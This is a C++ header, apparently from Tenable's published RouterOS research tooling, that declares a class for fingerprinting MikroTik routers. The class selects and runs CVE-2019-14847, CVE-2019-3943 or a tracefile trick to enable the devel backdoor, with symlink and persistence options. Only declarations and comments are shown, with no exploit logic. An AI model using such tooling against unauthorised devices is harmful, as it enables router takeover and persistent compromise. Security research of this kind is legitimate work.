  /*
    Copyright 2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#ifndef SPLOIT_HPP
#define SPLOIT_HPP

#include <string>

#include "makemessage.hpp"
#include "session.hpp"

class WinboxMessage;

/**
 * Sploit is a simple wrapper around three exploits that create the devel backdoor on
 * router's using RouterOS. The main goal of Sploit is to automatically identify the
 * router version, offer the user known methods to exploit the device, and actually
 * exploit the device.
 */
class Sploit
{
public:

    /**
     * \param[in] p_session this is a JSProxy or WinBox_Session object. We don't own this memory but
     *            do use it for the life span of this object!
     * \param[in] p_username the username the Session to logged in with
     * \param[in] p_password the password the Session used to login
     * \param[in] p_do_sym true if the user wants to drop a symlink in /rw/disk for version 6.41+
     * \param[in] p_do_persistence ture if the user wants to install persistence for version 6.41+
     */
    Sploit(Session& p_session, const std::string& p_username, const std::string& p_password,
           bool p_do_sym, bool p_do_persistence);

    ~Sploit();

    /**
     * All logic really falls off of here.
     */
    bool pwn();

private:

    /**
     * Requests the version from the remote router.
     * 
     * \param[in,out] p_version the acquired version
     * 
     * \return false if the request failed for some reason. True otherwise.
     */
    bool get_version(std::string& p_version);

    /**
     * Figure out the location of the backdoor and any special properties
     * it might have (e.g. must be a symlink)
     * 
     * \param[in] p_version the version of the router
     * 
     * \return true if we didn't encount an error.
     */
    bool get_backdoor_location(const std::string& p_version);

    /**
     * Offers the user a set of exploits that we can use on the target.
     * 
     * \param[in] p_version the version of the router
     * 
     * \return the user selected exploit
     */
    msg::exploits sploit_selection(const std::string& p_version);

    /**
     * Executes CVE-2019-14847 or CVE-2019-3943 depending on what the to/sub_to is.
     * For 14847: 2,2 and for 3943: 72,1
     * 
     * \param[in] p_to the binary to route the message to
     * \param[in] p_sub_to the handler to route the message to
     *
     * \return true if we didn't encounter an error.
     */
    bool do_traversal_vulns(boost::uint32_t p_to, boost::uint32_t p_sub_to);

    /**
     * Executes the HackerFantastic tracefile trick.
     * 
     * \return true if we encounter no error and find the telnet prompt.
     */
    bool do_hf_tracefile();

private:

    //! the session the sploiter is operating on
    Session& m_session;

    //! the username we are looged in as
    const std::string& m_username;

    //! the password we used to log in
    const std::string& m_password;

    //! An enum describing the backdoor
    msg::backdoor_location m_type;

    //! backdoor location
    std::string m_location;

    //! the tracked message id
    boost::uint32_t m_id;

    //! indicates if we want to drop a symlink on the remote target
    bool m_do_symlink;

    //! indicates if we want to add reboot persistence to the remote target
    bool m_do_persistence;
};

#endif